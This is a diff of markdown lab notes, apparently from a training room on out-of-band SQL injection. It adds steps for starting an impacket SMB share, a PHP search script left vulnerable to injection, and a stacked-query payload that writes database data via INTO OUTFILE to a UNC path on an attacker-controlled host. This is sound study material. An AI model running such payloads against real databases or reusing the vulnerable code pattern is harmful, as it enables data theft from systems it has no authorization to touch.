@@ -3,7 +3,7 @@ Out-of-band (OOB) SQL injection is an attack technique that pentester/red team
 
 One of the key advantages of Out-of-band SQL injection is its stealth and reliability. By using **different communication channels**, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. For instance, an attacker might inject a **SQL payload that triggers the database server to make a DNS request** to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised.
 
-## Out-Of-Band usecase
+## Usecase
 In scenarios where direct responses are sanitised or limited by security measures, OOB channels enable attackers to exfiltrate data without immediate feedback from the server. For instance, security mechanisms like **stored procedures**, **output encoding**, and **application-level constraints** can **prevent direct responses**, making traditional SQL injection attacks ineffective. Out-of-band techniques, such as using DNS or HTTP requests, allow data to be sent to an external server controlled by the attacker, circumventing these restrictions.
 
 Additionally, **Intrusion Detection Systems (IDS)** and **Web Application Firewalls (WAFs)** often **monitor and log SQL query responses for suspicious activity**, blocking direct responses from potentially malicious queries. By leveraging OOB channels, attackers can avoid detection by using less scrutinized network protocols like DNS or SMB to transfer data. This is particularly useful in network environments with limited direct connectivity between the attacker and the database server, such as when the server is behind a firewall or in a different network segment.
@@ -70,3 +70,47 @@ SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
 This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like `smbclient` or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.
 
 ## Practical Example
+In this scenario, we would enable a network share on the AttackBox at `{ATTACKBOX_IP}\logs`. This share is accessible over the network and allows files from other machines to be written to it. You may assume a scenario when you get a vulnerable system and want to pivot data to another network share system. The attacker will leverage this share to exfiltrate data Out-of-band. To have a network share, we would start the AttackBox and execute the following command in the terminal:  
+- Navigate to `impacket` directory using `cd /opt/impacket/examples`
+- Enter the command `python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp` to start the SMB server sharing the `/tmp` directory.
+- You can access the contents of the network share by entering the command `smbclient //ATTACKBOX_IP/logs -U guest -N`. This would allow you to connect to the network share, and then you can issue the command `ls` to list all the commands.
+
+We have the same web application with a search feature that queries visitors who visit the library. The server-side code for this feature is vulnerable to SQL injection, and you can access it at `http://10.10.205.210/oob/search_visitor.php?visitor_name=Tim`.
+	![](Pasted%20image%2020241211170822.png)
+
+The server code looks like this:
+```php
+$visitor_name = $_GET['visitor_name'] ?? '';
+
+$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
+
+echo "<p>Generated SQL Query: $sql</p>";
+
+// Execute multi-query
+if ($conn->multi_query($sql)) {
+    do {
+        // Store first result set
+        if ($result = $conn->store_result()) {
+            if ($result->num_rows > 0) {
+                while ($row = $result->fetch_assoc()) {
+```
+
+### **Important Consideration**
+It is important to note that the MySQL system variable `secure_file_priv` may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 
+- **When secure_file_priv is Set**: MySQL will restrict file operations such as **INTO OUTFILE** to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
+- **When secure_file_priv is Empty**: If the `secure_file_priv` variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.
+
+Attackers typically do not have direct access to check the value of the secure_file_priv variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.
+
+### **Payload**
+To exploit this vulnerability, the attacker crafts a payload to inject into the `visitor_name` parameter. The payload will be designed to execute an additional SQL query that writes the database version information to an external SMB share.
+```sql
+1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
+```
+
+- `1'`: Closes the original string within the SQL query.
+- `;`: Ends the first SQL statement.
+- `SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';`: Executes a new SQL statement that retrieves the database version and writes it to an SMB share at \\ATTACKBOX_IP\logs\out.txt.
+- `--`: Comments the rest of the original SQL query to prevent syntax errors.
+	![](Pasted%20image%2020241211180258.png)![](Pasted%20image%2020241211180442.png)
+	
